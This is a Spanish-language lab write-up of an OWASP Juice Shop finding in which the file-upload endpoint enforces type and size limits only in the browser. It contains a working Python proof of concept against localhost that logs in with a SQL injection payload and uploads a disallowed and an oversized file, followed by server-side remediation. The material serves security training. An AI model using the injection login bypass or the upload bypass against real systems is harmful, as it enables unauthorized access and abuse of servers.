<div align="center">

# 📤 File Upload — Bypass de Tipo y Tamaño
### OWASP Juice Shop · Validación Insuficiente de Archivos

![Status](https://img.shields.io/badge/Status-Verificado-00ff88?style=for-the-badge&logo=statuspage&logoColor=white)
![Severity](https://img.shields.io/badge/Severidad-Media-ffb300?style=for-the-badge)
![Type](https://img.shields.io/badge/Tipo-File%20Upload-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)

</div>

---

> **Hallazgo:** el endpoint `POST /file-upload` implementa las restricciones de tipo MIME y tamaño máximo únicamente en el cliente (JavaScript). El servidor no replica estas validaciones, aceptando cualquier tipo de archivo y archivos mayores a 100KB enviados directamente mediante request HTTP.

> [!WARNING]
> Uso exclusivo en laboratorio controlado (`http://localhost:3000`). No reproducir en sistemas sin autorización explícita.

---

## 📋 Resumen del Hallazgo

| Campo | Detalle |
|-------|---------|
| **Aplicación** | OWASP Juice Shop |
| **Endpoint** | `POST /file-upload` |
| **Contexto** | Soporte / Complaints — adjunto de queja |
| **Tipo** | File Upload — Client-Side Validation Bypass |
| **Severidad** | 🟡 Media |
| **CVSS v3** | 5.4 · AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L |
| **Autenticación** | Sí (Bearer token) |
| **Estado** | ✅ Verificado |

---

## 🔍 Descripción

El formulario de soporte en Juice Shop permite adjuntar un archivo a una queja. El control de tipo MIME y el límite de tamaño (`maxFileSize: 1e5` = 100KB) están definidos y ejecutados solo en el componente Angular del frontend. El backend en `POST /file-upload` no valida el `Content-Type` ni el tamaño del archivo, aceptando cualquier contenido enviado directamente vía HTTP.

> [!NOTE]
> La separación entre el upload (`/file-upload`) y la creación de la queja (`/api/Complaints/`) es un factor de diseño que también facilita el bypass — ambos endpoints se pueden consumir independientemente sin pasar por el formulario frontend.

---

## 🔬 Análisis Técnico

### `[01]` Validaciones observadas en frontend

```typescript
// Definidas solo en cliente — no existen en servidor
allowedMimeType: ['application/pdf', 'application/zip']
maxFileSize: 1e5  // 100 KB
```

### `[02]` Flujo de la vulnerabilidad

```
Frontend (Angular)
  └─ Valida MIME y tamaño ← atacante OMITE esto
  └─ POST /file-upload    ← atacante envía directo
  └─ POST /api/Complaints/

Backend
  └─ POST /file-upload   ← no valida MIME ni tamaño ✗
  └─ POST /api/Complaints/ ← crea registro con UserId ✗
```

---

## 🧪 Reproducción

### `[01]` PoC — Python

```python
python3 - <<'PY'
import requests, json

base = 'http://localhost:3000'

# 1. Autenticar
auth = requests.post(
    base + '/rest/user/login',
    json={'email': "' or 1=1--", 'password': 'x'}
).json()['authentication']

headers = {
    'Authorization': 'Bearer ' + auth['token'],
    'X-User-Email':  auth['umail']
}

# 2. Subir archivo de tipo no permitido (.txt)
with open('/tmp/bypass.txt', 'w') as f:
    f.write('tipo-no-permitido')

with open('/tmp/bypass.txt', 'rb') as f:
    r = requests.post(
        base + '/file-upload',
        headers=headers,
        files={'file': ('bypass.txt', f, 'text/plain')}
    )
    print('Upload TXT:', r.status_code)   # esperado: 204

# 3. Subir archivo > 100KB
with open('/tmp/big.pdf', 'wb') as f:
    f.write(b'%PDF-1.4\n' + b'A' * 120_000)

with open('/tmp/big.pdf', 'rb') as f:
    r = requests.post(
        base + '/file-upload',
        headers=headers,
        files={'file': ('big.pdf', f, 'application/pdf')}
    )
    print('Upload BIG:', r.status_code)   # esperado: 204

# 4. Crear complaint para completar el flujo
r = requests.post(
    base + '/api/Complaints/',
    headers={**headers, 'Content-Type': 'application/json'},
    data=json.dumps({'UserId': 1, 'message': 'upload-bypass-test'})
)
print('Complaint:', r.status_code, r.text[:100])
PY
```

### `[02]` Resultado observado

```
Upload TXT: 204
Upload BIG: 204
Complaint:  201 {"status":"success","data":{"id":1,"UserId":1,"message":"upload-bypass-test"}}
```

- Archivo `.txt` (tipo no permitido) aceptado con `204`
- Archivo PDF de 120KB (sobre límite de 100KB) aceptado con `204`
- Queja creada correctamente con `201`

### `[03]` Challenges resueltos

```bash
# Verificar challenges solved
python3 - <<'PY'
import json, urllib.request
ch = json.load(urllib.request.urlopen('http://localhost:3000/api/Challenges/'))['data']
for name in ['Upload Type', 'Upload Size']:
    print(name, '→', [c for c in ch if c['name'] == name][0]['solved'])
PY
```

Salida:
```
Upload Type → True
Upload Size → True
```

---

## 🔁 Flujo con Caido

1. Subir archivo desde el formulario de soporte
2. Capturar `POST /file-upload` (multipart) en `HTTP History`
3. `Send to Replay`
4. Cambiar: `filename`, `Content-Type`, contenido del archivo
5. Reenviar directamente — observar `204`
6. Crear complaint con `POST /api/Complaints/` para completar

---

## 💥 Impacto

- **Bypass de restricciones**: subida de tipos de archivo no autorizados
- **Almacenamiento de contenido inesperado**: archivos arbitrarios en el servidor
- **Potencial DoS**: archivos masivos consumen espacio en disco sin límite real
- **Pivot**: archivos almacenados pueden ser base para file confusion, parseo inseguro o path traversal posterior

---

## 🔧 Remediación

| Medida | Descripción |
|--------|-------------|
| **Validación server-side de MIME** | Verificar `Content-Type` y magic bytes en el backend, no solo en frontend |
| **Límite de tamaño server-side** | Implementar `maxFileSize` en middleware de backend (ej. `multer`) |
| **Whitelist de extensiones** | Rechazar extensiones no explícitamente permitidas |
| **Escaneo de contenido** | Verificar magic bytes reales del archivo, no solo la extensión declarada |

```javascript
// ✅ Multer con validación server-side
const upload = multer({
  limits: { fileSize: 100 * 1024 },        // 100KB server-side
  fileFilter: (req, file, cb) => {
    const allowed = ['application/pdf', 'application/zip'];
    cb(null, allowed.includes(file.mimetype));
  }
});
```

---

## 🔗 Referencias

- [PortSwigger — File Upload](https://portswigger.net/web-security/file-upload)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [CWE-434: Unrestricted Upload](https://cwe.mitre.org/data/definitions/434.html)
